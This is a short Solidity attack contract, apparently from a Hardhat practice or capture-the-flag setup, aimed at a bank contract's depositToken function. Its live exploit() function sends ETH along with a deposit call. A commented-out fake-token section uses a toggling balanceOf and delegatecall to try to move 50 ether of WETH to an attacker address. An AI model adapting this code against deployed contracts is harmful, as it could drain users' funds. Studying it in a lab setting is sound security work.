pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IBank {
    function depositToken(
        uint256 accountId,
        address token,
        uint256 amount
    ) external payable;
}

contract AttackBank {
    bool private switcher;
    address private attacker;
    address private weth;
    address payable private bank;

    // IBank private bank;

    constructor(
        address _attacker,
        address _weth,
        address _bank
    ) public {
        attacker = _attacker;
        weth = _weth;
        bank = payable(_bank);
        // bank = IBank(_bank);
    }

    // function transferFrom(
    //     address src,
    //     address dst,
    //     uint256 qty
    // ) public returns (bool) {
    //     return true;
    // }

    // function balanceOf(address who) public returns (uint256) {
    //     if (!switcher) {
    //         switcher = !switcher;
    //         uint256 amount = 50 ether;
    //         (bool resultAllow, bytes memory errorAllow) = weth.delegatecall(
    //             abi.encodeWithSignature(
    //                 "approve(address,uint256)",
    //                 attacker,
    //                 amount
    //             )
    //         );
    //         (bool result, bytes memory error) = weth.delegatecall(
    //             abi.encodeWithSignature(
    //                 "transfer(address,uint256)",
    //                 attacker,
    //                 amount
    //             )
    //         );
    //         console.log("result: ", result);
    //         return uint256(1);
    //     } else {
    //         switcher = !switcher;
    //         return uint256(0);
    //     }
    // }

    function exploit() public payable {
        (bool sent, bytes memory data) = bank.call{value: 1000}(
            abi.encodeWithSignature(
                "depositToken(uint256,address,uint256)",
                0,
                weth,
                10
            )
        );
        console.log(sent);
    }

    fallback() external payable {
        console.log("fallback receive eth");
    }

    receive() external payable {
        console.log("receive eth");
    }
}
